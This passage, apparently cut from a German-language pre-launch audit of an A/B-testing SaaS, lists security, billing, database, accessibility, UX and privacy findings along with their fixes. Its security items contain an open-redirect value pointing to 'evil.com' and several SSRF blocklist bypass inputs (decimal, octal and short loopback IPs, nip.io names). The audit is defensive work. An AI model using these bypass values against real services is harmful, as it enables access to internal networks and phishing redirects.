Auf 375 px Viewport bleiben **155 px** für den gesamten Content. Overview-Cards (`grid-cols-2`), Toolbar und `NewTestDrawer` sind darin nicht bedienbar; horizontaler Overflow. Ein zahlender Kunde, der unterwegs kurz seine Testergebnisse prüfen will, sieht ein zerbrochenes Layout. Für ein SaaS-Dashboard ist das ein Launch-Blocker.

### Lösung

`aside` → `hidden md:flex` plus mobiler Off-Canvas-Drawer (Top-Bar-Trigger, `translate-x-[-100%]` → `translate-x-0`), `main` → `md:pl-[220px]`. Off-Canvas mit Focus-Trap und Escape-Handling (siehe A11Y-02). Anschließend `mobile.spec.ts` um Dashboard-Cases erweitern — die Datei existiert bereits, deckt das Dashboard aber nicht ab.

---

# P1 — Vor dem Launch

## SEC-07 — Open Redirect und Session-Tokens in URL-Parametern ✅

**Schweregrad: Hoch** · Sicherheit / Auth · **[BEHOBEN — 22.07.2026]**

**Problem:** [`app/auth/callback/route.ts`](../ab-tool/app/auth/callback/route.ts):

- **Open Redirect** (`:74,101,137`): `NextResponse.redirect(new URL(next, req.url))` mit unvalidiertem `next`. `new URL('//evil.com', 'https://www.getvariante.com')` ergibt `https://evil.com/`. Da die Session zu diesem Zeitpunkt bereits gesetzt ist, ist das ein hochwertiger Phishing-Vektor („Login funktioniert, dann Weiterleitung").
- **Tokens im Query-String** (`:83-87`): `access_token` und `refresh_token` werden aus `searchParams` gelesen und an `setSession()` übergeben. URLs landen in Browser-History, `Referer`-Headern, Proxy- und Server-Logs. Ein Refresh-Token in einem Logfile ist eine dauerhafte Kontoübernahme.

**Lösung:**
```ts
function safeNext(raw: string | null): string {
  if (!raw || !raw.startsWith('/') || raw.startsWith('//')) return '/dashboard'
  return raw
}
```
Für die Tokens: den `token_hash`/PKCE-Pfad als einzigen Weg behalten (Supabase unterstützt beides) und den Query-Param-Zweig entfernen. Falls er für Legacy-Mails gebraucht wird: nach `setSession()` sofort auf eine URL ohne Parameter weiterleiten und die Frist für die Entfernung dokumentieren.

Zusätzlich: `catch (e: any)` (`:67`) auf `unknown` mit Type-Guard umstellen.

---

## SEC-08 — SSRF-Guard ist unvollständig und uneinheitlich ✅

**Schweregrad: Hoch** · Sicherheit · **[BEHOBEN — 23.07.2026] `lib/safeFetch.ts` + Refaktor**

**Problem:** Drei Ebenen:

1. **Blocklist mit Lücken** ([`lib/ssrf.ts:3`](../ab-tool/lib/ssrf.ts)): Dezimale IPs (`http://2130706433/` = 127.0.0.1), oktale Notation (`0177.0.0.1`), Kurzform `127.1` und DNS-Namen, die auf private IPs zeigen (`*.nip.io`, `localtest.me`), passieren alle. Eine Blocklist auf Hostname-Ebene ist strukturell die falsche Verteidigung.
2. **Uneinheitliche Anwendung:** `snippet-check` (`:69-73`) und `agentTools.fetchSite` (`:58-65`) prüfen `res.url` nach Redirects. `/api/suggestions` (`:95-105`) prüft nur den Ausgangs-Host und folgt dann Redirects blind. `picker-bridge` prüft gar nicht (SEC-02). `lib/extractPageCode.ts:61` prüft gar nicht.
3. **Kein Größenlimit:** `/api/suggestions:104` liest `await res.text()` unbegrenzt. Eine große Antwort ist eine Memory-Exhaustion in der Function.

**Lösung:**
- Eine `lib/safeFetch.ts`, die als **einziger** ausgehender Fetch-Pfad dient: Protokoll-Allowlist, DNS-Auflösung + Prüfung der aufgelösten IP gegen private/reservierte Bereiche (nicht gegen den Hostname-String), `redirect: 'manual'` mit Revalidierung pro Hop, harte Größen- und Zeitlimits.
- Alle Aufrufer darauf umstellen; `grep -rn "await fetch(" app lib` als Review-Gate.
- `/api/snippet-check` authentifizieren (aktuell darf jeder Anonyme unsere Server fremde URLs fetchen lassen).

---

## BILL-01 — Account-Löschung kündigt kein Abo und lässt Daten zurück ✅

**Schweregrad: Hoch** · Billing / DSGVO · **[BEHOBEN — 22.07.2026]**

**Problem:** [`app/api/profile/route.ts:62-91`](../ab-tool/app/api/profile/route.ts) löscht `daily_stats`, `tests`, `profiles` und den Auth-User. **Nicht** gelöscht bzw. behandelt:

- **Die Stripe-Subscription wird nicht gekündigt.** Der Kunde löscht seinen Account und wird weiter abgebucht — und hat danach keinen Zugang mehr zum Portal, um es zu stoppen. Das ist ein Fall für den Zahlungsdienstleister und potenziell eine Chargeback-Welle.
- **Storage-Objekte bleiben:** Avatar-Bild im Bucket `avatars` (`022:9`, `public=true`) und Preview-Screenshots (`023:102`, `public=true`). Ein Personenfoto, das nach „Account löschen" unter einer rateloser öffentlichen URL abrufbar bleibt, ist ein klarer Art.-17-Verstoß.
- **Nicht transaktional:** Schlägt `auth.admin.deleteUser` fehl (`:85`), sind Tests und Profil bereits weg, der Auth-User bleibt. Der Nutzer kann sich einloggen, `getApiUser` findet kein Profil und die App antwortet dauerhaft 401. Kein Retry, kein Cleanup-Job.

**Lösung:** Reihenfolge umkehren und vollständig machen:
```ts
if (profile?.stripe_subscription_id) await stripe.subscriptions.cancel(profile.stripe_subscription_id)
await deleteAvatarObjects(userId)
await deletePreviewShotsForUser(userId)
const { error } = await supabase.auth.admin.deleteUser(userId)  // kaskadiert tests/profiles/domains/…
if (error) return serverError()   // nichts wurde vorher zerstört
```
Plus ein Reconciliation-Cron, der verwaiste Storage-Objekte ohne DB-Referenz einsammelt.

---

## BILL-02 — Stripe-Webhook wirft bei jedem Event einen Fehler ✅

**Schweregrad: Hoch** · Billing · **[BEHOBEN — 22.07.2026] `revalidateTag` entfernt**

**Problem:** [`app/api/stripe/webhook/route.ts:109`](../ab-tool/app/api/stripe/webhook/route.ts): `revalidateTag('profile', \`user-${prof.user_id}\`)`.

In Next.js 16 ist der zweite Parameter von `revalidateTag` ein **Cache-Life-Profilname**, kein zweiter Tag. `user-<uuid>` ist kein definiertes Profil. Zusätzlich existiert im gesamten Projekt kein `cacheTag('profile')` und kein `'use cache'` — der Aufruf hat also selbst im Erfolgsfall keine Wirkung.

**Warum problematisch:** Der Aufruf steht innerhalb des `try`-Blocks **vor** dem Idempotenz-Insert (`:117`). Wirft er, greift der `catch`, die Route antwortet 500 — und `stripe_webhook_events` bekommt nie einen Eintrag. Folge: Stripe wiederholt das Event bis zu drei Tage lang, jeder Versuch schlägt wieder fehl, und Stripe deaktiviert den Endpunkt schließlich. Das Plan-Update selbst läuft vorher durch, der Ausfall ist also still — bis Stripe abschaltet.

**Lösung:** Zeile entfernen (es gibt nichts zu invalidieren). Falls Profil-Caching später eingeführt wird, korrekt mit `cacheTag()` verdrahten. Unabhängig davon: **Idempotenz-Insert vor die Verarbeitung ziehen** oder mindestens außerhalb des Blocks, der fehlschlagen kann. Und `invoice.payment_failed` behandeln (aktuell wird ein fehlgeschlagenes Zahlungsmittel nie sichtbar).

---

## OPS-02 — CI läuft nie, Linter hat keine Konfiguration ✅

**Schweregrad: Hoch** · Deployment · **[BEHOBEN — 22.07.2026] CI auf `master`, ESLint Flat Config, tsc+Lint+Accent-Guard**

**Problem:** Zwei unabhängige Befunde:

- [`.github/workflows/e2e.yml:4-13`](../.github/workflows/e2e.yml) triggert auf `branches: [main]`. Der Default-Branch des Repos ist **`master`** (`git branch -a`: nur `master`, `origin/HEAD -> origin/master`). **Die Pipeline hat noch nie gelaufen.** Die 89 E2E-Tests existieren, laufen aber in keinem automatisierten Kontext.
- `npm run lint` schlägt fehl: `ESLint couldn't find an eslint.config.(js|mjs|cjs) file`. `eslint` und `eslint-config-next` sind installiert, ein `lint`-Script existiert — eine Konfiguration nicht. Es gibt also **keinerlei statische Analyse**.

**Lösung:**
1. Workflow-Trigger auf `master` (oder Branch umbenennen — dann konsistent in `AGENTS.md`, das durchgehend von `main` spricht).
2. `eslint.config.mjs` mit `next/core-web-vitals` + `next/typescript` anlegen.
3. CI-Job um `npx tsc --noEmit` und `npm run lint` erweitern — beide als **blockierende** Schritte vor dem Build.
4. Branch-Protection auf `master`: keine Merges ohne grüne Pipeline.

Ohne diesen Punkt bleibt jeder andere Fix in diesem Dokument ungeschützt gegen Regression.

---

## OPS-03 — Kein Client-Side Error Tracking ✅

**Schweregrad: Hoch** · Monitoring · **[BEHOBEN — 22./23.07.2026] SentryInit + Health-Endpoint**

**Problem:** [`instrumentation.ts:14-22`](../ab-tool/instrumentation.ts) lädt Sentry bewusst nur für Node und Edge. Die Begründung („zero client JS auf den Marketing-Seiten") ist für `app/page.tsx` nachvollziehbar — **das Dashboard ist aber vollständig clientseitig gerendert.** `DashboardClient` (497 Z.), `ResultsClient` (1248 Z.), `AccountClient` (876 Z.), der gesamte Wizard.

**Warum problematisch:** Jeder Fehler, den ein zahlender Kunde im Produkt erlebt, ist unsichtbar. Ein `TypeError` in `ResultsClient` zeigt eine leere Seite, und niemand erfährt davon — es sei denn, der Kunde schreibt eine Mail. Für ein Produkt, dessen Wert im Dashboard liegt, ist das die falsche Stelle zum Sparen. UX-03 (der funktionslose Re-check-Button) ist genau die Art Fehler, die Client-Monitoring innerhalb einer Stunde gemeldet hätte.

**Lösung:** `instrumentation-client.ts` anlegen, aber **nur für `/dashboard`** initialisieren (Route-Guard im Init, oder Sentry per `next/dynamic` im Dashboard-Layout laden). Die Marketing-Seiten bleiben unberührt. Zwingend: `connect-src` in der CSP (`next.config.ts:31`) um die Sentry-Ingest-Domain erweitern, sonst werden die Beacons still geblockt.

**Ergänzend fehlt:** Ein Health-Check-Endpunkt für Uptime-Monitoring, Alerting auf 5xx-Raten (Vercel Log Drains oder Sentry-Alerts), und ein Dashboard für die Business-Metriken, die schon in der DB liegen (aktive Tests, Assign-Rate, Conversion-Rate). Aktuell würde ein Ausfall von `/api/resolve` — der Endpunkt, an dem das Produkt hängt — erst durch eine Kundenmeldung auffallen.

---

## DB-01 — Migrationsprozess ist nicht reproduzierbar ✅

**Schweregrad: Hoch** · Datenbank / Disaster Recovery · **[BEHOBEN — Migration 029, 23.07.2026]**

**Problem:** Der in [`README.md:33-36`](../README.md) dokumentierte Weg („`db/migrations/` in aufsteigender Reihenfolge im SQL-Editor ausführen") funktioniert nicht:

- **`007_dogfooding.sql:17`** enthält ein literales `'DEINE_USER_ID_HIER'` → `invalid input syntax for type uuid`. Die Kette bricht bei 007 ab.
- **`002_migrate_v1_to_v2.sql:9`** enthält `drop table if exists events cascade;`. Migration `010:7` legt acht Nummern später eine *neue* Tabelle `events` an — den produktiven Activity-Log. Ein erneuter Durchlauf löscht ihn samt Abhängigkeiten.
- **Drei Nummernkollisionen:** `012_temp_sessions`/`012_usage_tracking`, `016_realtime`/`016_variant_css`, `017_significance_level`/`017_source_tracking`. Die Ausführungsreihenfolge ist undefiniert.
- **Kein Tracking, kein Rollback:** keine `schema_migrations`-Tabelle, kein einziges `-- down` in 31 Dateien.
- **Der Zustand ist bereits einmal auseinandergelaufen** — `023_hybrid_onboarding.sql:9-15` dokumentiert es im Klartext und dupliziert 57 Zeilen aus `012`, weil diese Migration auf einer Datenbank nie lief.
- **Regressive Migration:** `012_usage_tracking.sql:6` trägt den Hinweis „⚠️ RE-RUN nach 2026-07-06" und definiert `increment_gen_cost` **ohne** `set search_path`. `027` repariert das. Ein versehentlicher Re-Run von 012 nach 027 setzt den Sicherheitsfix lautlos zurück.

**Warum problematisch:** Es gibt keine belastbare Aussage darüber, welches Schema in Production läuft. Eine Staging-Umgebung ist nicht aufbaubar, ein Point-in-Time-Restore nicht verifizierbar. Der Runbook nennt ein RPO von 24 h — das setzt voraus, dass man das Schema rekonstruieren kann.

**Lösung:**
1. `007_dogfooding.sql` nach `db/seeds/` verschieben, `002` nach `db/migrations/archive/`.
2. Kollisionen auflösen (`012a_`/`012b_` …) und in `README.md` dokumentieren, dass 001–002 historisch sind.
3. Tracking einführen:
   ```sql
   create table if not exists schema_migrations (
     version text primary key, applied_at timestamptz not null default now(), checksum text
   );
   ```
   Jede Migration endet mit `insert into schema_migrations(version) values ('025_rls_policies') on conflict do nothing;`
4. Re-Run-Hinweis in `012_usage_tracking.sql:6` entfernen und den `set search_path`-Block dort nachziehen.
5. Mittelfristig auf Supabase CLI (`supabase db push`, Zeitstempel-Präfixe) umstellen und einen CI-Check ergänzen, der `db/migrations/*.sql` gegen `schema_migrations` diffed.

---

## DB-02 — `020_test_health.sql` kann laufende Kundentests abschalten

**Schweregrad: Hoch** · Datenbank

**Problem:** [`db/migrations/020_test_health.sql:81`](../db/migrations/020_test_health.sql): `UPDATE tests SET name = name;` — ein `UPDATE` ohne `WHERE` über die gesamte Tabelle, nur um den frisch angelegten Trigger `trg_test_health` (`:67-70`) auf jeder Zeile feuern zu lassen. Der Trigger enthält (`:52-55`):

```sql
IF NEW.status = 'active' THEN NEW.status := 'draft'; END IF;
```

**Warum problematisch:** Zwei Effekte. Erstens wird jeder `active` Test, dem eines von fünf Feldern fehlt, **retroaktiv auf `draft` gesetzt** — laufende, bezahlte Kundentests werden ohne Benachrichtigung aus allen Cron-Filtern (`.in('status',['active','paused'])`) entfernt. Zweitens: Full-Table-Rewrite auf der heißesten Tabelle des Systems, und wegen `replica identity full` (`016_realtime.sql:7`) ein WAL-Schwall in Tabellengröße plus ein Realtime-Broadcast pro Zeile.

**Lösung:** Backfill batchen; den automatischen `active → draft`-Downgrade aus dem Trigger nehmen und stattdessen im API-Layer beim *Aktivieren* prüfen. Ein Schema-Deploy darf niemals Kundentests abschalten. (`:74-77` ist zusätzlich toter Code — `health_status` wurde in `:7` mit `DEFAULT 'issues'` angelegt und ist nie NULL.)

---

## DB-03 — Fehlende CHECK-Constraints: `traffic_split` kommt ungeprüft aus dem Request ✅

**Schweregrad: Hoch** · Datenintegrität · **[BEHOBEN — Migration 032, 23.07.2026] Constraints + API-Validierung**

**Problem:** `grep -c "check ("` über `db/migrations/` ergibt **0**. Alle Enums sind freier Text: `status` (`001:16`), `winner` (`001:31`), `plan` (`005:11`), `health_status` (`020:7`). Und [`app/api/tests/route.ts:153`](../ab-tool/app/api/tests/route.ts) übernimmt `traffic_split` **ungeprüft** aus dem Request-Body — während `name`, `site_url`, `selector` und `goal` direkt darüber (`:78-81`) längenvalidiert werden.

**Warum problematisch:** `traffic_split: 500` fließt direkt in `ab_assign`s `random() * 100 < v_split` (`001:57`) → 100 % Traffic auf B, der A/B-Test ist stumm kein Test mehr. Ein Tippfehler in `status` (`'Active'`) macht einen Test für alle Cron-Filter unsichtbar, während `/api/resolve` (filtert nur `!= 'paused'`) ihn weiter ausliefert — Daten laufen, werden aber nie ausgewertet. Ohne Constraint sind solche Zustände nicht auffindbar.

**Lösung:**
```sql
alter table tests
  add constraint tests_status_chk check (status in ('draft','active','paused','done','preview')),
  add constraint tests_winner_chk check (winner is null or winner in ('A','B')),
  add constraint tests_split_chk  check (traffic_split between 0 and 100),
  add constraint tests_siglvl_chk check (significance_level in (0.9, 0.95, 0.99));
alter table profiles
  add constraint profiles_plan_chk check (plan in ('free','pro','agency'));
```
Zusätzlich `traffic_split` in der API validieren. Vorher `select distinct status from tests;` prüfen, ggf. `not valid` + späteres `validate constraint`.

---

## DB-04 — Tests ohne Eigentümer bleiben auf Kundenseiten aktiv ✅

**Schweregrad: Hoch** · Datenintegrität · **[BEHOBEN — Migration 032, 23.07.2026] Constraint + Cascade + Resolve-Filter**

**Problem:** Seit `012_temp_sessions.sql:21` ist `tests.user_id` nullable, und `temp_session_id` hat `ON DELETE SET NULL` (`:29`). Keine Constraint verlangt, dass mindestens eine der beiden Spalten gesetzt ist.

**Warum problematisch:** Eine Zeile mit `user_id IS NULL AND temp_session_id IS NULL` ist über **keine API mehr erreichbar** (`app/api/tests/[id]/route.ts:67` filtert immer auf eine der beiden Spalten) — nicht löschbar, nicht editierbar, unsichtbar im Dashboard. `/api/resolve` liefert sie aber weiterhin an echte Besucher aus (`:50-56` filtert nur nach `site_host`/`selector`/`status`) und zeigt sogar das Badge (`:89`, `!t.user_id`). Ergebnis: **nicht abschaltbares HTML auf einer fremden Website.**

**Lösung:**
```sql
delete from tests where user_id is null and temp_session_id is null and status <> 'preview';
alter table tests add constraint tests_owner_chk
  check (user_id is not null or temp_session_id is not null);
alter table tests drop constraint tests_temp_session_id_fkey;
alter table tests add constraint tests_temp_session_id_fkey
  foreign key (temp_session_id) references temp_sessions(id) on delete cascade;
```

---

## A11Y-01 — Kein einziges `aria-expanded`, `role="dialog"`, `aria-invalid` im Frontend ✅

**Schweregrad: Hoch** · Accessibility · **[BEHOBEN — 22.07.2026] ARIA-States in 8 Komponenten**

**Problem:** Verifiziert: `grep -rn "aria-expanded|role=\"dialog\"|aria-modal|aria-controls|aria-describedby|aria-invalid" --include=*.tsx app components` → **0 Treffer**.

Betroffen: Sidebar-Account-Popover (`Sidebar.tsx:126`), `FilterDropdown:114`, TestCard-Kebab (`TestCard.tsx:262`), SetupClient-Accordion (`:427`), `SnippetStatusBadge:130`, `NotificationCenter:85`, Raw-Data-Toggle (`ResultsClient:999`), `WhatToTestNext`.

**Warum problematisch:** Screenreader-Nutzer erfahren nie, ob ein Menü offen ist, und finden den zugehörigen Inhalt nicht. Das ist WCAG Level A — nicht AA. Bei B2B-Verkauf an Agenturen und Konzerne ist ein fehlender VPAT ein Ausschlusskriterium in der Beschaffung; im öffentlichen Sektor (BITV 2.0) ist es ein Rechtsproblem.

**Lösung:** Jeder Toggle-Button bekommt `aria-expanded={open}` + `aria-controls="<id>"`, das Panel die passende `id`. Kebab-Menüs zusätzlich `role="menu"`/`role="menuitem"`. Formularfehler (`login/page.tsx:272`, `signup/page.tsx:274`, `AccountClient.tsx:426`) über `aria-describedby` + `aria-invalid` an das Input binden, Fehlercontainer mit `role="alert"`.

---

## A11Y-02 — `NewTestDrawer`: Modal ohne Focus-Trap, Escape, Focus-Restore, Scroll-Lock

**Schweregrad: Hoch** · Accessibility (WCAG 2.1.2 / 2.4.3)

**Problem:** [`NewTestDrawer.tsx:284-293`](../ab-tool/app/dashboard/components/NewTestDrawer.tsx): Der Backdrop ist ein `div` mit `onClick` (kein `button`, kein `tabIndex`, kein `onKeyDown`). Der Drawer hat kein `role="dialog"`/`aria-modal`/`aria-labelledby`, keinen Escape-Handler, keinen Focus-Trap, keinen Focus-Restore auf den auslösenden Button, kein `overflow:hidden` auf `body`.

**Warum problematisch:** Ein Tastaturnutzer öffnet den Wizard und tabbt sofort in den dahinterliegenden Dashboard-Content, ohne zu bemerken, dass der Fokus das Modal verlassen hat. Escape schließt nicht, der Hintergrund scrollt mit. Das ist der zentrale Erstellungs-Flow.

**Lösung:** `role="dialog" aria-modal="true" aria-labelledby="new-test-title"` + `<h2 id="new-test-title">`. Backdrop → `<button aria-label="Close">` oder `aria-hidden` mit Schließen nur per Escape/X. Focus-Trap-Hook (erstes fokussierbares Element fokussieren, Tab-Zyklus einfangen), `body`-Scroll-Lock, Focus-Restore beim Unmount. Der Hook ist wiederverwendbar für alle Dropdowns aus A11Y-01.

---

## A11Y-03 — `focus:outline-none` an 28 Stellen ohne sichtbaren Ersatz

**Schweregrad: Hoch** · Accessibility (WCAG 2.4.7, AA)

**Problem:** U. a. `login/page.tsx:241`, `signup/page.tsx:244`, `update-password/page.tsx:142`, `AccountClient.tsx:448,618,697,834`, `onboarding/page.tsx:207`, `StepUrlAndElement.tsx:107,133`. Der Ersatz ist teilweise nur `focus:border-border-strong` — ein Wechsel von `rgba(255,255,255,0.10)` auf `0.18`, also ~1.1:1 gegenüber dem vorherigen Zustand. In `AccountClient.tsx:618` und `:697` gibt es gar keinen Fokusstil.

**Warum problematisch:** Ein Tastaturnutzer verliert beim Ausfüllen von Login- und Signup-Formular die Orientierung vollständig — also in der Registrierungsstrecke zahlender Kunden.

**Lösung:** Projektweit `focus:outline-none` → `focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-text/40 focus-visible:ring-offset-2 focus-visible:ring-offset-bg-0`. Das korrekte Muster existiert bereits in `DashboardClient.tsx:291` — konsequent übernehmen.

---

## A11Y-04 — Textkontrast unter AA; `text-text-3` hat 224 Vorkommen

**Schweregrad: Hoch** · Accessibility (WCAG 1.4.3, AA)

**Problem:** [`app/globals.css:12`](../ab-tool/app/globals.css): `--color-text-3: rgba(237,237,237,0.40)`. Gegen `--color-bg-1` (#0a0a0a) ergibt das effektiv #656565 → **ca. 3.4:1**. Light Mode (`:36`) gegen #ffffff → **ca. 2.5:1**. AA verlangt 4.5:1 für Text < 18.66 px — angewendet wird `text-text-3` durchgängig auf 10–12 px.

Schlechter noch: `text-[#ededed]/30` (`ResultsClient:1063`, `NotificationCenter:148`) → ca. 2.4:1, und `text-white/45` auf der Landingpage (`page.tsx:169,232,381`) → ca. 4.4:1, knapp unter der Schwelle für den gesamten Fließtext der Marketing-Seite.

**Warum problematisch:** Das betrifft nahezu jede Hilfestellung, jedes Meta-Label und jede Erklärung im Produkt. Nutzer über 40 oder bei Tageslicht am Laptop lesen die Onboarding-Hinweise schlicht nicht — das ist auch ein Aktivierungsproblem, nicht nur ein Compliance-Thema.

**Lösung:** `--color-text-3` auf mind. `rgba(237,237,237,0.58)` (≈4.6:1) bzw. Light `rgba(26,26,26,0.56)` anheben. `text-*/30` und `/25` nur für rein dekorative Icons. `axe-core` in Playwright einhängen und in `test:ci` als blockierenden Check laufen lassen.

---

## UX-03 — „Re-check"-Button ist funktionslos ✅

**Schweregrad: Hoch** · Bug · **[BEHOBEN — 22.07.2026] useEffect + direkter recheckDomain-Call**

**Problem:** [`SnippetStatusBadge.tsx:44-46`](../ab-tool/app/dashboard/components/SnippetStatusBadge.tsx) synchronisiert den Zustand **in der Render-Phase**:
```ts
if (hasVerifiedDomain && primaryDomain && banner.phase !== 'verified') {
  setBanner({ phase: 'verified', url: primaryDomain })
}
```
Der Klick setzt `phase: 'input'` (`:55`); beim direkt folgenden Re-Render greift die Bedingung und setzt sofort auf `'verified'` zurück. Betrifft beide Re-check-Buttons (`:118`, `:160`).

**Warum problematisch:** Wenn ein Kunde das Snippet deployed oder entfernt hat und den Status prüfen will, reagiert die UI nicht. Er wird annehmen, die App sei kaputt — was sie hier ist.

**Lösung:** Sync-Logik in ein `useEffect` mit Abhängigkeit auf `primaryDomain` verschieben; „Re-check" ruft direkt `recheckDomain(domain)` auf, statt den Zustand zurückzusetzen.

---

## UX-04 — `alert()` im Checkout-Pfad ✅

**Schweregrad: Hoch** · UX · **[BEHOBEN — 22.07.2026] Toast statt alert()**

**Problem:** [`BillingClient.tsx:28-30`](../ab-tool/app/dashboard/billing/BillingClient.tsx): `alert(json.error || 'Error')` und `alert('Connection failed.')`. Das Projekt hat einen `ToastProvider` im Root-Layout, korrekt genutzt in `DashboardClient.tsx:141` und `ResultsClient.tsx:179`.

**Warum problematisch:** Ein blockierender nativer Dialog mit dem Text „Error" — genau an der Stelle, an der der Nutzer Geld ausgeben will. Zusätzlich wird die rohe API-Fehlermeldung ungefiltert angezeigt, und `alert()` ist auf iOS-Safari unterdrückbar.

**Lösung:** `useToast()` verwenden, verständliche Meldung: „Checkout could not be started. Please try again or contact support." Rohe API-Fehler nie ungefiltert anzeigen — betrifft auch `test-wizard/create/route.ts:157-161`, das `insertErr.message` und `code` an den Client zurückgibt und damit DB-Interna preisgibt (widerspricht der `safeLog`-Politik).

---

## UX-05 — Sprachmix: deutsche Checkout-Seite, deutsche Datumsformate, deutsche KI-Prompts

**Schweregrad: Hoch** · UX / Vertrauen

**Problem:**
- [`app/auth/checkout/page.tsx`](../ab-tool/app/auth/checkout/page.tsx) ist **komplett deutsch** („Pro-Account wird eingerichtet …", „Du wirst in Kürze zu Stripe weitergeleitet.") — mitten in einem durchgehend englischen Produkt. Zusätzlich Inline-Styles statt Tokens und ein Spinner in `#f97316` (Orange, existiert in der Monochrom-Palette nicht mehr).
- `ResultsClient.tsx:422,510,602,1040`: alle Chart-Achsen und die Raw-Data-Tabelle sind hart auf `toLocaleDateString('de-DE')` (Format `TT.MM`) gesetzt, obwohl `<html lang="en">`.
- `WhatToTestNext.tsx:27-30`: die Free-Tier-Teaser sind deutsch — geblurred, aber vom Screenreader vollständig vorlesbar (kein `aria-hidden` auf dem Blur-Layer).
- `WhatToTestNext.tsx:321` und `app/api/agent/route.ts:38-73`: der Agent-Prompt ist deutsch und verleitet das LLM zu deutschen Antworten im englischen UI.

**Warum problematisch:** Der internationale Kunde klickt „Upgrade to Pro" und landet auf einer deutschen Zwischenseite in fremdem Look — im Moment der Kaufentscheidung. Ein US-Kunde liest `07.22` als 7. Februar.

**Lösung:** Checkout-Seite übersetzen und auf Tokens umstellen. Zentrale `formatDate()`-Utility mit `toLocaleDateString(undefined, …)`. Teaser übersetzen, Blur-Container `aria-hidden="true"`. Agent-System-Prompt auf Englisch.

---

## UX-06 — Landingpage bricht im Light Mode; Theme ohne Toggle

**Schweregrad: Hoch** · UI

**Problem:** Es existiert ein vollständiges Light-Theme (`globals.css:28-47`) und ein render-blockierendes Inline-Script (`layout.tsx:98-102`), das `localStorage.getItem('variante-theme')` liest. Die Landingpage nutzt aber überall hartes `white`/`rgba(255,255,255,…)` (`globals.css:158,174,187,231,237,262,276,315`, `page.tsx:46`). In Light Mode wäre `bg-bg-0` = `#ffffff` und sämtliche Headlines weiß auf weiß. **Einen Theme-Toggle gibt es nirgends** — `grep "variante-theme"` findet nur das Script selbst.

**Warum problematisch:** Wer den `localStorage`-Key aus einer alten Session hat oder manuell setzt, sieht heute schon eine leere Seite. Und ~40 Zeilen CSS plus ein render-blockierendes Script existieren für ein Feature, das niemand erreichen kann.

**Lösung:** Entscheiden — entweder Light Mode fertigstellen (alle `white`-Literale auf `var(--color-text)` umstellen, Toggle bauen) oder Theme-Script und `html.light`-Block ersatzlos entfernen. Der Zwischenzustand ist die schlechteste Option.

---

## LEGAL-01 — `ab.js` setzt localStorage ohne Consent; kein AVV für Kunden

**Schweregrad: Hoch** · Recht (TTDSG/DDG §25, DSGVO Art. 28) · **[TEILWEISE BEHOBEN — Consent-API existiert]**

**Problem:** `ab.js` schreibt auf jeder Kundenseite `localStorage['ab_<key>']` (`:640,647`) und `sessionStorage['ab_conv_<key>']` (`:474-478`) — ohne jede Consent-Prüfung und ohne API, über die ein Kunde sein Consent-Management-Tool anbinden könnte.

**Status:** ✅ Punkt 1 (Consent-API) umgesetzt. `window.varianteConsent = true/false` + cookieless Default (In-Memory ohne Storage-Zugriff, §25 TTDSG-konform). Die restlichen Punkte sind offen.

Zusätzlich:
- **Die Datenschutzerklärung ist an dieser Stelle unzutreffend.** `privacy/page.tsx:156` listet `__ab_visitor_id` (localStorage) — diesen Key setzt `ab.js` nirgends. Der tatsächlich gesetzte `ab_conv_<key>` in sessionStorage ist nicht deklariert.
- **Kein AVV-Angebot.** variante ist Auftragsverarbeiter für die Besucherdaten seiner Kunden. Ohne AVV nach Art. 28 DSGVO darf kein B2B-Kunde in Deutschland das Snippet einsetzen. Aktuell gibt es weder Vorlage noch Prozess.
- **Besucher-IPs gehen im Klartext an Upstash** (`lib/rateLimit.ts:50`: `rl:resolve:203.0.113.5`). In der DB wird vorbildlich keine IP gespeichert — im Rate-Limiter dann doch, bei einem weiteren Auftragsverarbeiter. Upstash ist in der Sub-Prozessor-Tabelle (`privacy:124`) korrekt gelistet, aber die Verarbeitung ist dokumentationspflichtig.
- **Google-Favicon-Requests** (`TestCard.tsx:213`): jede Test-Karte lädt `google.com/s2/favicons` — Google ist **nicht** in der Sub-Prozessor-Tabelle, und `docs/page.tsx:320` behauptet ausdrücklich „No third-party analytics or CDNs".
- **Kein Datenschutz-Link im Signup-Flow** (`signup/page.tsx:316-334`). Art. 13 verlangt Information zum Zeitpunkt der Erhebung; ein Link im Footer der Landingpage ist angreifbar.

**Warum problematisch:** Der Kunde ist Verantwortlicher und trägt das Bußgeldrisiko — er kann das Produkt rechtskonform nicht einsetzen. Sobald ein Kunde seinen Datenschutzbeauftragten fragt, bricht der Deal.

**Lösung:**
1. **Consent-API in `ab.js`:** `window.varianteConsent = true/false` bzw. Integration in TCF/Google Consent Mode v2. Ohne Consent: kein Storage. Zusätzlich ein `cookieless`-Modus (Zuweisung deterministisch aus einem täglich rotierenden Hash statt persistentem Storage) als rechtssichere Default-Option.
2. **AVV-Vorlage** bereitstellen und im Account-Bereich zum Abschluss anbieten.
3. Datenschutzerklärung an den tatsächlichen Code angleichen (Keys korrigieren, Google ergänzen oder — besser — die Favicon-Requests entfernen).
4. IPs vor Verwendung als Redis-Key hashen (`sha256(ip + IP_HASH_SALT)`).
5. Datenschutz-Link unter den Signup-Button.

> Rechtsberatung ersetzt dieser Punkt nicht. Vor dem Launch eine anwaltliche Prüfung der Snippet-Konstellation einholen.

---

## LEGAL-02 — Datenexport (Art. 20) deckt vier von neun Tabellen ab ✅

**Schweregrad: Hoch** · DSGVO · **[BEHOBEN — 22.07.2026] Alle Tabellen + daily_stats**

**Problem:** [`app/api/profile/export/route.ts:17-20`](../ab-tool/app/api/profile/export/route.ts) liefert `profiles`, `tests`, `events` (auf 500 limitiert) und `domains`. Fehlen: `agent_runs` (`019:8`), **`site_insights`** (`019:25`, enthält mit `analysis_json` die substanziellste gespeicherte Auswertung über den Kunden), `wizard_drafts` (`028:8`), `daily_stats` (`010:31`).

**Lösung:** Die vier Tabellen ins `Promise.all` aufnehmen, das `events`-Limit entfernen oder paginieren, bei Kürzung ein `truncated`-Flag setzen.

---

# P2 — Kurz nach dem Launch

## PERF-01 — Jeder Pageview ist ein `UPDATE` auf einer einzelnen Zeile ✅ (Sofortmaßnahme)

**Schweregrad: Hoch** · Skalierung · **[TEILWEISE BEHOBEN — Migration 033] `replica identity default`**

